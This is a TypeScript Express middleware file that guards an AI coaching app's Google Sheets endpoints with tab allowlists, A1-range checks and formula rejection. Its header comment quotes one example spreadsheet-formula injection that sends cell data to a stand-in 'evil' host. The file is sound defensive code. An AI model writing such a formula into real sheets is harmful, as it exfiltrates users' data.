import { Request, Response, NextFunction } from 'express';

/**
 * Sheet access policy for the generic /coaching/sheets/* endpoints.
 *
 * WHY (2026-10-16): read_sheet / update_sheet_range passed the model-supplied
 * tab name and A1 range straight into the Sheets API. Any tab could be read
 * or overwritten, a range like "Goals!A1:Z" could switch tabs, the generic
 * DELETE endpoints could drop any tab, and USER_ENTERED writes would execute
 * a cell like `=IMPORTXML("https://evil/?d="&A1)` as a formula, which is a
 * data-exfiltration path. The coach only legitimately touches a known set of
 * tabs, so access is now an allowlist:
 *   - READ:   the coaching tabs + Workout_<date> sheets
 *   - WRITE:  the tabs the coach appends/edits + Workout_<date> sheets
 *   - CREATE: NUTRITION_LOG + Workout_<date>
 *   - DELETE: Workout_<date> only
 * Extra tabs can be allowed with BRIDGE_EXTRA_READ_TABS / BRIDGE_EXTRA_WRITE_TABS
 * (comma-separated).
 */

const WORKOUT_TAB = /^Workout_\d{4}-\d{2}-\d{2}(?:_[A-Za-z0-9]{1,30})?$/;

const csv = (v: string | undefined) => (v ?? '').split(',').map((s) => s.trim()).filter(Boolean);

const WRITE_TABS = new Set([
  'WORKOUT_DATABASE', 'BODY_COMPOSITION', 'WHOOP_History', 'NUTRITION_LOG', 'Weekly_Workout_Plan',
  ...csv(process.env.BRIDGE_EXTRA_WRITE_TABS),
]);
const READ_TABS = new Set([
  ...WRITE_TABS, 'Goals', 'Tasks', 'EQUIPMENT', ...csv(process.env.BRIDGE_EXTRA_READ_TABS),
]);
const CREATE_TABS = new Set(['NUTRITION_LOG']);

export type SheetOp = 'read' | 'write' | 'create' | 'delete';

export function tabAllowed(title: unknown, op: SheetOp): boolean {
  if (typeof title !== 'string' || title.length === 0 || title.length > 100) return false;
  const isWorkout = WORKOUT_TAB.test(title);
  if (isWorkout) return true; // all ops allowed on per-day workout sheets
  switch (op) {
    case 'read':
      return READ_TABS.has(title);
    case 'write':
      return WRITE_TABS.has(title);
    case 'create':
      return CREATE_TABS.has(title);
    case 'delete':
      return false;
  }
}

/** A1 range WITHIN the tab: "A1", "A1:H20", "A:A", "G136". No "!" (no tab switching). */
const A1_RE = /^\$?[A-Z]{1,3}\$?(?:[1-9][0-9]{0,6})?(?::\$?[A-Z]{1,3}\$?(?:[1-9][0-9]{0,6})?)?$/;

export function validRange(range: unknown): boolean {
  return typeof range === 'string' && range.length <= 24 && A1_RE.test(range);
}

const MAX_ROWS = 5000;
const MAX_COLS = 40;
const MAX_CELL = 5000;

/** 2D array of primitives, bounded, with no formula injection. Returns an error message or null. */
export function validateGrid(data: unknown): string | null {
  if (!Array.isArray(data)) return 'data must be a 2D array';
  if (data.length > MAX_ROWS) return `too many rows (max ${MAX_ROWS})`;
  for (const row of data) {
    if (!Array.isArray(row)) return 'data must be a 2D array';
    if (row.length > MAX_COLS) return `too many columns (max ${MAX_COLS})`;
    for (const cell of row) {
      if (cell === null || cell === undefined || typeof cell === 'boolean') continue;
      if (typeof cell === 'number') {
        if (!Number.isFinite(cell)) return 'cells must be finite numbers';
        continue;
      }
      if (typeof cell !== 'string') return 'cells must be strings, numbers, booleans or null';
      if (cell.length > MAX_CELL) return `cell too long (max ${MAX_CELL} chars)`;
      // Writes use USER_ENTERED, so a leading "=" would run as a formula.
      if (/^\s*=/.test(cell)) return 'formulas are not allowed in written cells';
    }
  }
  return null;
}

function reject(res: Response, message: string, status = 400, code = 'INVALID_INPUT') {
  return res.status(status).json({ success: false, error: { message, code } });
}

/**
 * Router-level guard for /coaching/sheets/* (mounted BEFORE the Google auth
 * check, so a bad request never even loads credentials).
 */
export function sheetAccessGuard(req: Request, res: Response, next: NextFunction) {
  const m = /^\/sheets(?:\/([^/]+))?(\/data|\/range|\/append)?\/?$/.exec(req.path);
  if (!m) return next();
  const title = m[1] != null ? decodeURIComponent(m[1]) : undefined;
  const sub = m[2];
  const method = req.method;

  if (title === undefined) {
    if (method === 'GET') return next(); // list tabs
    if (method === 'POST') {
      return tabAllowed(req.body?.title, 'create') ? next() : reject(res, 'Creating that tab is not allowed', 403, 'TAB_NOT_ALLOWED');
    }
    return reject(res, 'Unsupported operation', 405);
  }

  let op: SheetOp;
  if (method === 'GET' && sub === '/data') op = 'read';
  else if (method === 'DELETE' && !sub) op = 'delete';
  else if ((method === 'PUT' || method === 'POST' || method === 'DELETE') && sub) op = 'write';
  else return reject(res, 'Unsupported operation', 405);

  if (!tabAllowed(title, op)) return reject(res, `Tab "${title}" is not allowed for ${op}`, 403, 'TAB_NOT_ALLOWED');

  const range = method === 'GET' || method === 'DELETE' ? req.query.range : req.body?.range;
  if (sub === '/range' && range === undefined) return reject(res, 'range is required');
  if (range !== undefined && !validRange(range)) {
    return reject(res, 'range must be an A1 range within the tab, e.g. "A1:H20" (no sheet prefix)');
  }
  if ((method === 'PUT' || method === 'POST') && sub) {
    const err = validateGrid(req.body?.data);
    if (err) return reject(res, err);
  }
  return next();
}

export const DATE_RE = /^\d{4}-\d{2}-\d{2}$/;
/** A real calendar date in YYYY-MM-DD. */
export function isRealDate(s: unknown): s is string {
  if (typeof s !== 'string' || !DATE_RE.test(s)) return false;
  const d = new Date(`${s}T12:00:00Z`);
  return !Number.isNaN(d.getTime()) && d.toISOString().slice(0, 10) === s;
}
